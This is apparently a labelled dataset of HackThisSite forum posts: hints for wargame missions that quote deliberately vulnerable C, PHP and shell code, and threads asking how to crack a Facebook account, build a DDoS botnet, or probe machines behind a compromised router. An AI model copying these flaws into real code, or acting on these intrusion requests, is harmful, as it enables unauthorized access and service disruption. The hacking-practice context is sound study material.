label	title	content
0	Extended Basics Tutorial	"extbasics tutorial extbasic 1 so we have this: code:  select all void blah(char *str) { char lol[200]; strcpy(lol, str); } the method declares an array called lol of type char and then copies what you input into it. arrays are useful for storing large amounts of similar data. for example, if you had a database of tax rates for people then it would be much easier to make an array of doubles than to make 400 or however many doubles of different names. when declaring an array the format is  code:  select all type arrayname[index]; type is the kind of data the array will hold(i.e. int, string, char, long, double, float) all the variables of an array must have the same data type. arrayname is simply what you want the array to be called. index is an int specifying how many objects will be in your array. to reference an array you do arrayname[desiredindex], arrayname being the name of the array you want, and desiredindex being what element of the array you want to access. it is important to remember that the index starts at 0 so to access the first element of the array you would do arrayname[0]. if you try to call an element of the array with an index higher than the max you set when declaring the array you will receive an error and the program will terminate. extbasic 2 we have this function: code:  select all $lvl_text = file_get_contents($_post[filename]..php); a mistake i made when i first tried was trying to figure out what command i needed to tell the function to find the source code. you dont need one. if you cant get this mission chances are you tried hackthissite.org/index.php and dont understand why it was wrong. try taking a closer look at the code. notice something that may be getting added twice? extbasic 3 code:  select all begin notr.eal create int as 2 destroy int as 0 ans var as create + to out to the mission will be a lot easier if you know a programming language. you really need to think about what each line of the program is doing. it might help to think about possible abbreviations.  extbasic 4 code:  select all {user types 6,7} begin f.ake var int as in int var as in out var int again, pretty easy if you know a programming language. dont be confused by the first line, the user is entering 6 and 7, the first part isnt actual code. hmm, the program then makes two variables whose values must be this ""in"" thing. what could in be short for? next the program out var and int what could out be short for? extbasic 5 here is the shell: code:  select all #!/bin/sh rm ok sed -e ""s/eval/safeeval/"" <exec.php >tmp && touch ok if [ -f ok ]; then rm exec.php && mv tmp exec.php fi the only part you need to worry about is the shell. its really easy to overthink this. you can think of sed as the find/replace function in other programs. basically, it is finding eval in exec.php and replacing it with safeeval in tmp. the only problem is that always owned sam forgot something. if you arent familiar with sed, you can learn a lot here: http://www.grymoire.com/unix/sed.html extended basic 6 code:  select all <?php $user =$_get[user]; $pass = $_get[pass]; if (isauthed($user,$pass)) { $passed=true; } if ($passed==true) { echo you win; } ?> <form action=""me.php"" method=""get""> <input type=""text"" name=""user"" /> <input type=""password"" name=""pass"" /> </form> <?php function isauthed($a,$b) { return false; } ?> ok. lets look at the code. it gets the username and password then runs the function isauthed on them. if isauthed(user,pass) returns true then the variable passed is set to true. (the default for booleans is true that is why you dont need ==true in the if statement.) next, if passed has been set to true we win the mission. hmm, it doesnt look like we can get the password anywhere, but maybe we can just skip right past having a correct username and password. think about what value you would change if you could change one. now how can we change that value? it says enter the correct url and it also says that the sysadmin doesnt know much about web configuration. what could we add to the given url to send the information we want?"
1	Gathering information behind a home router	hey all, ive been under the impression that in the absence of internet-facing vulnerable services on a network, an attacker might try to compromise the router itself and use that as a point from which to attack machines inside the network.  so with that assumption, i figured id try to sate my curiosity and see just what one could do once a router was under malicious control.  the problem is, i honestly dont know much about what can be done, and google is only so helpful (actually, i mostly have to use bing these days as im behind the great firewall and i dont currently have a proper vpn at my disposal.  ugh.  but thats neither here nor there.) now, since the point of this exercise doesnt yet involve the actual exploitation of said router (ill get to that when i feel im ready), i set up a simple d-link router i had available inside my network with unsecured remote administration enabled, and put a computer running a couple virtual machines behind it. this means, as youve probably figured out, that i can have complete? control of the router from outside the lan.  from here i know of a few things that can be done, like changing the dns to a malicious server to redirect traffic to spoofed sites, and whatnot.  aside from that, i can also see which machines are connected to the router.  what im not so sure about is whether there is any way to gather further information about these machines from outside the network.  i tried port forwarding and scanning that range with nmap, but still all i can see are the web administration port for the router, and port 21 which shows up as tcpwrapped and is not accepting incoming connections. does anybody know of any way to scan or otherwise obtain a little more information about the computers behind a compromised router?  i feel like ive hit a dead end.   on a similar note, how would this be different if the router in question were an enterprise-grade router?  i cant exactly afford a nice cisco or other of that type, so i cant test it myself at this point in time, but its still something id like to know about. if anyone could shed some light on this subject for me, i would really appreciate it.
3	Is HTML a programming language?	"logs from irc wrote: [ <jon> oh yeah. [ <jon> all you need is a compiler. [ <jon> e.g. an interpreter. [ <button> and the browser is an intrepter... [ <button> i see somewhat... [ <jon> it would be a different type of logic than c or anything reasonable. but my point was that its possible. [ <button> but jon  html is only used to define what certain things are [ <button> it can by itself take no actions on the objects [ <button> it needs js for that [ <jon> are you sure? [ <jon> its markup, like any programming language. [ <button> yeah  html is designed to seperate design and objects [ <button> most browsers ignore that rule and add there own default design [ <jon> but in this case it would be interpeted by a compiler into binary [ <button> but its still not part of html in of itself [ <jon> its not that anyone would ever do such a thing (c is our friend). but my point was that its not only plausible, but very possible. [ <jon> most people are confused on what a ""programming"" language actually is. [ <button>  its not possible for html the way it is designed to perform even basic arithmatic [ <jon> sure it is. [ <button> how? [ <jon> providing its interpretted correctly. [ <jon> which is nothing short of what a compiler is designed for. [ <button> but the way it is designed it cant ever operate on previsly defined data [ <button> in fact the real way for a browser to display html with no css/js is a blank page or just the text [ <button>  http://www.w3.org/markup/ [ <jon> html/and xml are all about data. and letting what is usually a browser interpret that data, and react accordingly [ <button> yes  intrepet but no do anything with [ <jon> if your browser doesnt do anything with the data, then how do webpages work? [ <jon> why does <body bgcolor=""red""> produce a red background? [ <button> they are invalid  they arent supposed to do anything with it unless it has css or js [ <button> bgcolor is taken out [ <button> it has been replaced with style="""" [ <button> from css [ <jon> alright, then tables. [ <button> b/c bgcolor is against the point [ <jon> provide formatting information to the browswer, and it then puts the text in nice little rows. [ <button> tables should not be used for design  [ <button> a browser should show a table as pure text unless it has css [ <button> most browsers use a default style [ <jon> its just an example of how html provides data for the browser, which reacts accordingly. [ <button> but that it not html [ <button> html converted to c should look like [ <button> var el1=""table"" [ <button> var el2 = ""fdk"" [ <button> var el4 = ""data"" [ <button> its basicly a list of data with no actions [ <jon> html is xml, and xml is all about data. if you have data, you can do almost anything you like with it. [ <button> yes [ <button> but xml is merely data [ <jon> what is a c program? just a bunch of text? [ <button> it is not the actions you would take [ <jon> says who? [ <button> c contains both data and actions [ <button> says the w3c [ <jon> whos to say that html or anything in this world cant be interpreted into machine language? [ <jon> you can convert machine code into a picture, and visa versa. which should be proof enough that the concept is sound. [ <button> erm  it can be [ <jon> vice versa maybe.. my spelling is not so good. [ <button> it would look like [ <button> store this to memory [ <button> store b to memory [ <button> store c to memory [ <button> and thats it [ <button> it would have no further actions.... [ <jon> brilliant colors? yes.  as well as awesome patterns [ <button> no colors [ <button> colors are part of css [ <button> not pure htm [ <button> not pure html [ <jon> html can be, and is, interpretted in many ways. [ <button> yes  based upon css or js [ <jon> no. [ <button> pure html is an array of data [ <button> no more [ <jon> yep. and if you have data. you have everything. [ <button> no  [ <jon> at least.. everything required to build an executable file. [ <button> you need to be able to take actions upon the data [ <jon> who says you cant? [ <button> which html has no built in ability to do so [ <jon> how do you think your compiler works? [ <button> jon the html is like the main file while css is like the header [ <jon> (assuming youve used one) [ <button> the compiler cant work w/o either [ <jon> yes it can. [ <button> jon not if the main file calls functions from the header [ <jon> who says that the main has to call functions from a header? [ <button> jon how should a browser display this line correctly [ <button> <strong>fun</strong> [ <jon> doesnt matter. [ <jon> what matters is what it does. [ <button> what does that line do then? [ <jon> in a standard browser? [ <button> no  [ <button> in a perfect browser [ <button> (one that actually follows all rules) [ <jon> like i said. it doesnt matter. what matters is what the browser decides to do with that information. [ <button> where html elements define the abstract structure of a document, css directives are interpreted by the web browser to render those elements in visual form.  [ <button> it does matter  [ <button> a perfect browser would do nothing with that line [ <button> as it doesnt tell it to do anything [ <button> it would just display the text as is  maybe   <jon> yes, because thats how the browser was designed.  <jon> what if you designed a browser to convert that into machine code? well then youve got a compiler.  <button> besides no html specification has ever called html a programming language, or anything like that. [16: <jon> and? [16: <button> ml documents are sgml documents with generic semantics that are appropriate for representing information from a wide range of domains. [16: <button> html is information, not instructions [16: <jon> no one ever referred to c as a programming language in the 1700s but that surely is not proof that it is not one today.  <jon> information is, and can be instructions.  <button> hrm  i see where we differ at least...  <jon>   standards arent set in stone.  <jon> is my point.  <button> information is mearly data, inscructions are operations based upon data  <button> 1 + 1 = 2  <button> 1 is data  <button> + is an insrction  <jon> + is data.  <button> would you say that 1 is an instruction  <button> + is not data  <jon> everything is data.  <button> + by itself would tell you nothing  <button> jon do you consider ms word documents to be a programming language?  <jon> if they were interpretted correctly, yes.  <button> what about word lists used by jtr  <jon> again. under the circumstances as i have previosly described, yes.  <button> what is ""a"" ?  <jon> data.  <button> and is that a program?  <button> and is the alphabet a programming language?  <jon> could be. a compiler could find all instances of a, and replace them with the equivalent of mov eax,97  <button> jon if something is a programming language then there must be something that is not a programming language  correct ?  <button> according to you all things everywhere is a programming language  <jon> not necesarrily(spelling)  <button> dont worry about spelling   <button> html is only a static collection of data  <button> jon   http://www.cs.tut.fi/~jkorpela/prog.html  > i took some of my arguments from there  read it  its interesting  anyway  i see where we differ  <button> its mostly definitions... 06 * button has a stricter definition  <jon>   people often dont see programming for what it really is.  <button> jon some people assume too much is programming   <button>   <button> anyway  i enjoyed talking to you...  <jon> lol. certainly not.  <button> how often are you on?  <jon> same.  <jon> from time to time.  <button> lol kk  are you ever on the forums?  <jon> less and less though, finals are coming up.  <jon> not in a long time.  <button>    join again hackthissite.org/forums  <jon> not on cs anymore?  <button> no  they split   <jon> why?  <button> cause the cs oldies didnt like hts  <button> mind if i paste these logs?"
1	Wargames dosnet	hello all, hope this is the right place to put this. ok long story short.. my college mark for this term is 50% from the practical work we do. were split into pairs for a kind of wargame, one of us is the attacker and one the defender. this month im meant to be attacking my friends server (its all on our private network.) this week is meant to be attack and defend against denial of service. i tried a basic dos from my box but he mitigated it after a while. so what im looking at is a ddos tool for a botnet, ive got a few other computers on the network i can use. by the rules though i cant actually go and run the dos from each box but if i could create a dosnet with them then i could win this week. i dont have the skills to make my own and i cant find them anywhere, ive checked p2p networks and google. ive heard about mydoom and wintrinoo (i dont want to have to go linux and use trinoo.. that wont end well for me) but when i try to find any kind of server configuration for them all i can find is ways to stop them. any help much appreciated.
3	HTS: Terms Of Service	by registering, or reading any content on this site, i agree to abide by the terms of service, and other guidelines on this website. my continued use of the website implies my acceptance of these terms of service and guidelines. (1) by accepting this agreement, i certify the following: (a) i have attained the legal age of majority in my jurisdiction or (b) i am below the age of majority, but i have obtained the necessary permission in my jurisdiction (2) i understand the customs, standards,and laws of the jurisdiction in which i reside, as well as the site and computer to which i am transporting this material, and i am solely responsible for my actions. (3) if i use this site in violation of this agreement, i understand i may be in violation of local and/or federal laws. (4) by reading any content on this site, i release and discharge hackthissite, its agents, its staff, and all affiliated parties  from any and all liability which might arise from any use even if hackthissite has been notified of such damage. under no circumstances shall hackthissite be liable to me on account of my or anyone elses use or misuse of or reliance on the hackthissite site. arising from any claim relating to this agreement or the subject matter hereof such limitation of liability shall apply to prevent recovery of direct, indirect, incidental, consequential, special, exemplary, and punitive damages whether such claim is based on warranty, contract, tort (including negligence), or otherwise, even if hackthissite have been advised of the possibility of such damages. such limitation of liability shall apply whether the damages arise from use or misuse of and reliance on the hackthissite site, from inability to use the hackthissite site, or from the interruption, suspension, or termination of the hackthissite site (including such damages incurred by third parties). this limitation shall also apply with respect to damages incurred by reason of other site or goods received through or advertised on the hackthissite site or received through any links provided in the hackthissite site, as well as by reason of any information or advice received through or advertised on the hackthissite site or received through any links provided in the hackthissite site. this limitation shall also apply, without limitation, to the costs of procurement of substitute goods or site, lost profits, or lost data. such limitation shall further apply with respect to the performance or non-performance of the hackthissite site or any information or merchandise that appears on, or is linked or related in any way to, the hackthissite site. such limitation shall apply notwithstanding any failure of essential purpose of any limited remedy and to the fullest extent permitted by law. without limiting the foregoing, under no circumstances shall hackthissite be held liable for any delay or failure in performance resulting directly or indirectly from acts of nature, forces, or causes beyond its reasonable control, including, but not limited to, internet failures, equipment failures of any kind, electrical power failures, strikes, labor disputes, riots, insurrections, civil disturbances, shortages of labor or materials, fires, floods, storms, explosions, acts of god, war, governmental actions, orders of domestic or foreign courts or tribunals, non-performance of third parties, or loss of or fluctuations in heat, light, or air conditioning. (5) i understand the dangers associated with sharing my personally identifiable information, including my full name, telephone number, or address over the internet. i agree not to share such information with other users. in the event that i do share such information, i do so at my own risk and hold hackthissite harmless and without any liability. (6) i will use hackthissite for the purpose of reading the content under the terms and conditions of this agreement. i warrant that i am not registering for, and will not access, read, copy or otherwise reproduce, transmit or communicate any portion of hackthissite for other purposes, including, but not limited to, establishing my own forum or website. (7) i agree that hackthissite , its owners and agents do not hold themselves out to have any kind of expert or professional training or knowledge in connection with hackthissite and make no warranties of fitness or quality of the content of any writings emails, statements, private messages or other communications. by accepting the terms of this agreement, i agree to indemnify hackthissite its agents, from any claim in negligence (or any other tort), contract or action under state or federal legislation for loss to myself, any company that i am employed by or act as an agent for, and/or any other injury or loss that i may claim to have been caused by using hackthissite  or from relying on advice from this site or received via email, post and/or by any other means. (8) the contents of the web site pages, including, but not limited to text, graphics, and icons, are copyrighted materials owned, controlled, or licensed by hackthissite and may contain hackthissite s name, trademarks, service marks, and trade names. i understand that i may download these materials for personal use only. no other permission is granted to me to print, copy, reproduce, distribute, transmit, upload, download, store, display in public, alter, or modify these materials. (9) i agree that my access and use of hackthissite is subject to the terms of this agreement and the sole discretion of the  of the hackthissite staff. i agree that my membership and use of hackthissite is at-will, and that my membership may be terminated at any time and for any reason by the hackthissite staff. i agree to abide by all decisions of hackthissite regarding my use, access and membership on the web site, including restriction, changes or revocation of my membership. (10) i agree that if my membership is permanently revoked for any or no reason, i will not make any attempt to obtain access to this site. i agree that violation of this provision will be considered and construed as illegal computer cracking, conversion and misappropriation of electronic resources, and that i will be strictly liable for any time lost by hackthissite in connection with my violation of this provision. (11) hackthissite s site are made available for your personal, non-commercial use only. you may not use hackthissite to sell a product or service, or to increase traffic to your web site, including but not limited to advertising sales without express approval from hackthissite s authorized agents. (12)hackthissite may modify or terminate our site at any time, for any reason and without notice, including the right to terminate service without notice, without liability to you, any other user or any third party. hackthissite reserves the right to modify these terms of service at any time without notice. (13) (a) these terms of service will be governed by and construed in accordance with the laws of the state of new york, without giving effect to its conflict of laws provisions or my actual state or country of residence. if for any reason a court of competent jurisdiction finds any provision or portion of the terms of service to be unenforceable, the remainder of the terms of service will continue in full force and effect. (b) in the event of any action arising as a result of these terms hackthissite shall have full authority to choose the location and times of the proceedings without regard to the wishes of the other party. this choice shall extend to actual location of the court room without overriding the governing laws. no matter where the actual proceedings take place the laws shall still follow those of (13)(a) (14)if i have any conflict with hackthissite i agree to: (a)first contact hackthissite to see if the conflict can be resolved without third parties (b)use binding arbitration according to the terms of the american binding arbitration association (c)pay for the arbitration myself (15)if any dispute arises over the intent or meaning of these terms the final understanding of these terms shall rest with hackthissite. (16)the text of these agreements are copyrighted and may not be copied, reproduced, reused, or modified in any way or be used for any other purpose. [i]permission to use these terms has been granted by the copyright holder [/i] [i]some of these terms are in the public domain, please contact the copyright holder of the entire terms of service before  using these terms[/i] [i] version 1.4 [/i] any questions can be addressed in the comments section or asked to monica directly.
1	Cracking Facebook passowrd but...	this is a challenge i have been facing lately. i have been trying to hack a facebook account but in the process i do not want to change the password. i was wondering if anyone know of a way to do this?
3	Who do you think is to blame when iCloud is hacked?	"http://mybroadband.co.za/news/security/ ... apple.html from my broadband ""a hacker’s release of personal photos of actress jennifer lawrence and other female celebrities on the internet on the weekend has again drawn our attention to the security of our personal information online. are we really aware of what we upload? and how can we make sure the information we intend for private viewing remains private? with new devices incorporating features for recording personal data, such as the health monitoring technologies used in samsung’s gear and the apple health app, should we be even more concerned about our ability to control our private data? most of the hacked images were reportedly obtained through apple’s icloud service which can automatically back up personal data from apple products to its servers. cloud confusion how icloud works is baffling even to some computer security experts. the response from apple has been unequivocal. while the tech giant said it was “outraged”, the official response noted:     none of the cases we have investigated has resulted from any breach in any of apple’s systems including icloud or find my iphone. so individual users were responsible for any failure to take the proper precautions to make sure personal data remains in personal control. the blame game like those who defend the hackers of stolen photos, apple is blaming the victims of the attack without acknowledging the role its service plays in opening up private data to these attacks. this position is indefensible for several reasons. social media and services such as icloud present us with countless examples of personal data doing things that seem counter to the will of the individual. in a study i published last year, facebook users sometimes feared their data to have a “life” that does not correspond to that of the person who “owns” the data generated. like our facebook profiles, we assume what we backup with any cloud services to be “our” data. yet the terms and conditions of whatever you upload to icloud state:     […] you grant apple a worldwide, royalty-free, non-exclusive license to use, distribute, reproduce, modify, adapt, publish, translate, publicly perform and publicly display. these words mirror similar statements in facebook’s terms of service. at the same time, apple is clear to claim:     […] you, and not apple, are solely responsible for any content you upload, download, post, email, transmit, store or otherwise make available through your use of the service. merely using icloud means that apple can do what it wants with your data, but you – and only you – are responsible with what happens to that data. placing the blame on the individual, as apple does, results in a common response whenever data are thought to be beyond the control of the user: delete all of your personal information online, shared intentionally or not. this response simply is not good enough given how cloud services operate. they make multiple copies in multiple locations, stored on multiple servers and hard drives across the globe. these files are uploaded automatically and are built into new features of our mobile devices. when an individual deletes a file, this does not mean that it is actually deleted, simply by virtue of how computer storage works. all about trust apple may wish to absolve itself of responsibility when individuals lose control of their personal data. in legal terms, apple places all burden on the individual for the management of their data. yet understanding the control of data as a personal matter disregards how these services actually operate. if apple and other cloud-based services want our trust, then they have to acknowledge the role their products play in perpetuating anxieties of data-out-of-control. they must refuse to place sole responsibility on their users – the victims of these attacks. grant bollmer does not work for, consult to, own shares in or receive funding from any company or organisation that would benefit from this article, and has no relevant affiliations.     this article was originally published on the conversation.     read the original article."" what do you think? i believe the people are to blame in some sense, because you shouldnt post the nudes of you online in the first place. but secondly apple is to blame for their shitty security measures."
1	New to hacking, some help would be nice	"im new to this kind of hacking stuff.. well anyway i want to learn hacking. just to let you know im not a complete noob at computers. i have experience in programming with c++ and visual basic, and also a little with html and very little javascript. i know sdl (which is a cross-platform api that works with c++) and ive made several games using c++ and sdl. i have about 2 years of experience in programming, but i never really got much into learning about web/server design, etc... ive gotten to level 5 of the basic missions (dont give me hints, i still want to figure this out by myself) and i already complete dall of the javascript missions and im on level 4 in the realistics mission.  now about hacking. how can i get started on the subject? i know that theres many so-called fields of hacking. i want to learn how to do crazy/weird stuff with my computer, how to crack passwords (but not vandalize websites), and stuff like that. ive read several hacking tutorials/articles/lectures but they dont seem to be helping much. the problem is that im not sure where to get started.  should i start with html? javascript? php? sql? learning the command prompt? how about learning more computer theory? or should i continue on learning with c++?  ive already gotten tired of making games, and besides ive already found this hacking thing to be more interesting than making games.  i know theres also other languages such as lisp, perl, asp but i wont really worry much about that.  but i really do need my questions to be answered.  oh and please answer these too:    -do i absolutely need linux to hack? why is it important that it is open source? can i still be considered a hacker (or at least know how to hack) if i dont have experience with using linux?    -is php/javscript/sql compatible with linux? how about perl and lisp?   -what are some other languages that are important to learn for hacking?   -is a .php file an actual webpage, or does it just contain the code for a webpage, or both?   -is it a good idea to create a website by hand with html and javascript? would it be enough for the site to function well?   and for html, i made a test website and i included on it what i learned about html so far. my css sheet wont work for some reason. do i have to add more to the css sheet or am i doing something wrong?  code:  select all <html> <head> <title>my website</title>  <link ref=""stylesheet"" type=""text/css"" href=""style.css"" /> </head> <body> <p><h1>my personal website</h1></p> <p>wanna see what this website has to offer? then go to the <a href=#navigation>website navigation menu</a></p>.  <p><em>regular emphasis</em></p> <br /> <p><strong>strong text</strong></p> <br /> <p><h4>unordered list:</h4></p> <ul>    <li>list object 1</li>    <li>list object 2</li> </ul> <br  /> <p><h4>ordered list:</h4></p> <ol>    <li>list object 1</li>    <li>list object 2</li> </ol> <br /> <p><h1 id=""navigation"">website links</h1></p> <p><strong><a href=""page2.html"">page 2</a></strong></p> <p><strong><a href=""survey.html"">survey</a></strong></p> <br /> <img src=""cubes.png"" width=""100"" height=""100"" alt=""cubes logo"" /> </body> </html> css: code:  select all strong {    font-style: italic;    text-transform: uppercase; } ____ thanks"
2	Phone (landline) hacking?!	im not sure if this is in the right place... ah well, here goes.  earlier today my friend seems to have had his landline (on bt) hacked... im just wondering how this is possible (no, im not going to try it, im just intrigued by how this has happened). i know little about landline phones, but he said that someone called him when he had an answer machine on and there was office sounds but no actual message. he thought this odd so tried to find out who it was.  upon further inspection he found that it was his own landline number that had called. i understand that there are many online services that allow you to spoof a number, but after talking to his provider (bt) they claim that he may be charged for all calls made by the hacker (if it was me, id set up my own premium line and call that with the hacked phone number meaning that id get paid from the line and theyd incure a bill).  is this possible? if so how (and how can i prevent it)?
3	Good site to learn coding	i am a noob on this site, and i kept getting stuck after mission two and had to keep looking for help.  i finally got tired of that because it wasnt helping me learn how to actually figure out problems for myself.  to help myself i asked a friend what a good site to learn programming is and he linked me to  http://w3schools.com  which is teaching me more than i ever even knew about.  bottom line... all noobs who do not know how to code should visit this site before they start any missions.
